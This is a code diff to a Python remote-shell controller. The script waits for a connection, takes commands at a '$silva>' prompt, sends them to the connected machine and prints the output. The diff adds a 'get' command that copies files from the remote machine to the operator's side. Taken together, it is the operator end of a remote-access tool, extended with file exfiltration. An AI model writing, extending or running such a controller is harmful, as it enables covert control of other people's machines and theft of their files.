@@ -6,6 +6,13 @@ import psutil
 import subprocess as sp
 import json
 
+def recvfile(filename, socket):
+    filedata = socket.recv(1000000)
+    f = open(filename, 'wb')
+    f.write(filedata)
+    f.close()
+    print('file downloaded !')
+
 print('Waiting for Recieving Connection...')
 
 
@@ -20,10 +27,16 @@ msg = str(input('$silva> '))
 rb = None
 while msg != 'exit':
     try:
-        c.send(msg.encode('ascii'))
-        rb = c.recv(1000000)
-        res = rb.decode('ascii')
-        print(res)
+        if msg.startswith('get'):
+            fn = msg.replace('get ', '')
+            recvfile(fn, c)
+        elif msg == 'help':
+            print()
+        else:
+            c.send(msg.encode('ascii'))
+            rb = c.recv(1000000)
+            res = rb.decode('ascii')
+            print(res)
     except Exception as e:
         print('the problem is : ' + str(e))
     msg = str(input('$silva> '))
